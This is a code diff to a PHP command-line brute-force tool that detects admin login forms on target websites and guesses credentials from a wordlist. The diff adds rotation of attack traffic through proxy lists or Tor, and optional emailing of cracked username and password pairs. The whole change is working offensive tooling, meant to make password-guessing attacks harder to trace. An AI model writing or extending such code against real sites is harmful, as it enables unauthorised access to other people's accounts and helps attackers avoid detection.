@@ -13,6 +13,7 @@ use Symfony\Component\Console\Helper\ProgressBar;
 use Respect\Validation\Validator as v;
 use Aszone\WordPress\WordPress;
 use Aszone\Site\Site;
+use Aszone\ProxySiteList\ProxySiteList;
 use Service\Mailer;
 use Service\GuzzleTor;
 
@@ -52,6 +53,11 @@ class BruteForceController extends Command{
                     	null,
                     	InputOption::VALUE_NONE,
                     	'Set the hash. Example: --tor'),
+                    new InputOption(
+                        'proxySiteList',
+                        null,
+                        InputOption::VALUE_NONE,
+                        'Set the hash. Example: --proxySiteList'),
 
                     new InputOption(
                         'email',
@@ -110,6 +116,7 @@ class BruteForceController extends Command{
         $wordlist    = $input->getOption('wordlist');
         $optionTor   = $input->getOption('tor');
         $optionMail   = $input->getOption('mail');
+        $ProxySiteList= $input->getOption('proxySiteList');
 
         //verify if target is list or one
         $targets=$this->getTargetsInArray($target);
@@ -212,9 +219,22 @@ class BruteForceController extends Command{
         }
 
 
-        
-    }
 
+    }
+    protected function getProxy($tor,$proxySiteList)
+    {
+        $proxy = new ProxySiteList();
+        //Use Tor
+        if($proxySiteList)
+        {
+            return $proxy->getProxyOfSites();
+        }
+        if($tor){
+            return $proxy->getTor();
+        }
+        return array();
+
+    }
     protected function executeBruteForceAll(InputInterface $input, OutputInterface $output)
     {
         //$wordlistClass = new Wordlist();
@@ -222,21 +242,17 @@ class BruteForceController extends Command{
         $target      = $input->getArgument('target');
         $username    = $input->getOption('username');
         $wordlist    = $input->getOption('wordlist');
-        $optionTor   = $input->getOption('tor');
-        $optionMail   = $input->getOption('email');
+        $tor         = $input->getOption('tor');
+        $email       = $input->getOption('email');
+        $ProxySiteList= $input->getOption('proxySiteList');
 
+        //Return $proxy if it exist
+        $proxy=$this->getProxy($tor,$ProxySiteList);
         //verify if target is list or one
         $targets=$this->getTargetsInArray($target);
 
         //verify is wordlist and set wordlist default
         $wordlist=$this->getWordListInArray($wordlist);
-
-        //Use Tor
-        $tor=false;
-        if($optionTor){
-            $middleware = new GuzzleTor();
-            $tor=$middleware->tor();
-        }
 
         if($targets!=false && $wordlist!=false)
         {
@@ -249,8 +265,10 @@ class BruteForceController extends Command{
             {
                 $output->writeln("");
                 $output->writeln("<info>Target ".$keyTarget." - ".$valueTarget."</info>");
-                $site = new Site($valueTarget);
-                $site->setTor($tor);
+
+                $site = new Site($valueTarget,$proxy);
+
+
                 //$resultIsJoomla=$site->isJoomla();
                 $resultIsAdmin=$site->isAdmin();
                 //$resultIsAdmin=true;
@@ -260,13 +278,18 @@ class BruteForceController extends Command{
                     $passwordField  = $site->getNameFieldPassword();
                     $actionForm     = $site->getActionForm();
                     $methodForm     = $site->getMethodForm();
+
                     $excludeValues[]=$usernameField;
                     $excludeValues[]=$passwordField;
                     $otherFields=$site->getOthersField(array_merge($usernameField,$passwordField));
+                    if(!isset($otherFields[$actionForm]))
+                    {
+                        $otherFields[$actionForm]=array();
+                    }
                     $resultOfBruteForce=$site->bruteForceAll($actionForm,$methodForm,$usernameField,$passwordField,$otherFields[$actionForm]);
+
                     if($resultOfBruteForce)
                     {
-
                         $resultFinal[0]['target']=$valueTarget;
                         $resultFinal[0]['username']=$resultOfBruteForce['username'];
                         $resultFinal[0]['password']=$resultOfBruteForce['password'];
@@ -274,8 +297,10 @@ class BruteForceController extends Command{
                         {
                             $resultFinal[0]['obs']=$resultOfBruteForce['obs'];
                         }
+                        if($email){
+                            $this->sendMailWordPress($resultFinal);
+                        }
 
-                        $this->sendMailWordPress($resultFinal);
                     }
                     //
                     //$methodForm     = $site->getMethodForm();
